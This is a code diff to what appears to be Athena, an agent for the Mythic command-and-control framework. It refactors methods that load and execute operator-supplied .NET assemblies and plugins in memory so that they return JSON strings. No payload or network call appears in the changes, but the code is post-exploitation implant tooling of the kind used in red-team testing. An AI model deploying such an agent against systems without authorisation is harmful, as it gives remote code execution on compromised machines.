@@ -44,10 +44,12 @@ namespace Athena.Commands
                 Assembly _tasksAsm = Assembly.Load($"{name}, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");
                 if (_tasksAsm != null)
                 {
+                    Console.WriteLine("Found Assembly");
                     foreach (Type t in _tasksAsm.GetTypes())
                     {
                         if (typeof(IPlugin).IsAssignableFrom(t))
                         {
+                            Console.WriteLine("Found Plugin.");
                             IPlugin plug = (IPlugin)Activator.CreateInstance(t);
                             loadedPlugins.GetOrAdd(plug.Name, plug);
                             return true;
@@ -65,7 +67,7 @@ namespace Athena.Commands
         /// Load an assembly into our execution context
         /// </summary>
         /// <param name="job">MythicJob containing the assembly</param>
-        public async Task<ResponseResult> LoadAssemblyAsync(MythicJob job)
+        public async Task<string> LoadAssemblyAsync(MythicJob job)
         {
             //This will load an assembly into our Assembly Load Context for usage with.
             //This can also be used to help fix resolving issues when loading assemblies in trimmed executables.
@@ -89,7 +91,7 @@ namespace Athena.Commands
                         user_output = "Invalid target specified",
                         completed = "true",
                         status = "error"
-                    };
+                    }.ToJson();
                 }
                 //Return true if success
                 return new ResponseResult
@@ -97,7 +99,7 @@ namespace Athena.Commands
                     task_id = job.task.id,
                     user_output = "Successfully loaded assembly",
                     completed = "true"
-                };
+                }.ToJson();
 
             }
             catch (Exception e)
@@ -108,14 +110,14 @@ namespace Athena.Commands
                     user_output = e.Message,
                     completed = "true",
                     status = "error"
-                };
+                }.ToJson();
             }
         }
         /// <summary>
         /// Execute an operator provided assembly with arguments
         /// </summary>
         /// <param name="job">MythicJob containing the assembly with arguments</param>
-        public async Task<ResponseResult> ExecuteAssembly(MythicJob job) //How do I deal with this now?
+        public async Task<string> ExecuteAssembly(MythicJob job) //How do I deal with this now?
         {
             //Backup the original StdOut
             var origStdOut = Console.Out;
@@ -126,7 +128,7 @@ namespace Athena.Commands
                     completed = "true",
                     user_output = "An assembly is already executing.!",
                     task_id = job.task.id,
-                };
+                }.ToJson();
             }
 
             ExecuteAssemblyTask ea = JsonSerializer.Deserialize<ExecuteAssemblyTask>(job.task.parameters);
@@ -158,7 +160,7 @@ namespace Athena.Commands
                 ResponseResult result = await this.GetAssemblyOutput();
                 result.user_output += Environment.NewLine + "Finished Executing.";
 
-                return result;
+                return result.ToJson();
 
                 //Maybe set an event that the execution is finished?
             }
@@ -172,7 +174,7 @@ namespace Athena.Commands
                     user_output = this.GetAssemblyOutput() + Environment.NewLine + e + Environment.NewLine + e.ToString(),
                     task_id = job.task.id,
                     status = "error"
-                };
+                }.ToJson();
             }
         }
         /// <summary>
@@ -185,7 +187,7 @@ namespace Athena.Commands
 
             //Clear the writer
             this.executeAssemblyWriter.GetStringBuilder().Clear();
-            
+
             return new ResponseResult
             {
                 user_output = output,
@@ -197,7 +199,7 @@ namespace Athena.Commands
         /// Clear the execution context of any loaded assemblies
         /// </summary>
         /// <param name="job">MythicJob containing the assembly</param>
-        public async Task<ResponseResult> ClearAssemblyLoadContext(MythicJob job)
+        public async Task<string> ClearAssemblyLoadContext(MythicJob job)
         {
             //This will clear out the assembly load context for the Athena agent in order to leave it fresh for future use.
             //This will help scenarios where you have a library loaded with a specific version, but need to load that library again for a different one
@@ -210,7 +212,7 @@ namespace Athena.Commands
                     task_id = job.task.id,
                     completed = "true",
                     user_output = "AssemblyLoadContext reset."
-                };
+                }.ToJson();
             }
             catch (Exception e)
             {
@@ -220,14 +222,14 @@ namespace Athena.Commands
                     completed = "true",
                     user_output = e.Message,
                     status = "error"
-                };
+                }.ToJson();
             }
         }
         /// <summary>
         /// Load a command into the command execution context
         /// </summary>
         /// <param name="job">MythicJob containing the assembly</param>
-        public async Task<LoadCommandResponseResult> LoadCommandAsync(MythicJob job)
+        public async Task<string> LoadCommandAsync(MythicJob job)
         {
             LoadCommand command = JsonSerializer.Deserialize<LoadCommand>(job.task.parameters);
 
@@ -239,7 +241,7 @@ namespace Athena.Commands
                     user_output = "Command already loaded.",
                     task_id = job.task.id,
                     status = "error"
-                };
+                }.ToJson();
             }
 
             try
@@ -268,7 +270,7 @@ namespace Athena.Commands
                                 cmd = command.command,
                             }
                         }
-                };
+                }.ToJson();
             }
             catch (Exception e)
             {
@@ -279,12 +281,12 @@ namespace Athena.Commands
                     task_id = job.task.id,
                     status = "error",
                     commands = new List<CommandsResponse>(),
-                };
+                }.ToJson();
 
             }
         }
         
-        public async Task<object> UnloadCommands(MythicJob job)
+        public async Task<string> UnloadCommands(MythicJob job)
         {
             //LoadCommand command = JsonSerializer.Deserialize<LoadCommand>(job.task.parameters);
 
@@ -296,7 +298,7 @@ namespace Athena.Commands
                 user_output = "Plugins unloaded!",
                 task_id = job.task.id,
                 commands = unloaded,
-            };
+            }.ToJson();
 
         }
         
@@ -308,10 +310,17 @@ namespace Athena.Commands
         {
             try
             {
-                Dictionary<string, object> parameters = JsonSerializer.Deserialize<Dictionary<string, object>>(job.task.parameters) ?? new Dictionary<string, object>();
+                Dictionary<string, string> parameters;
+                if (string.IsNullOrEmpty(job.task.parameters))
+                {
+                    parameters = new();
+                }
+                else
+                {
+                    parameters = JsonSerializer.Deserialize<Dictionary<string, string>>(job.task.parameters);
+                }
                 parameters.Add("task-id", job.task.id);
                 this.loadedPlugins[job.task.command].Execute(parameters);
-
                 return null;
             }
             catch (Exception e)
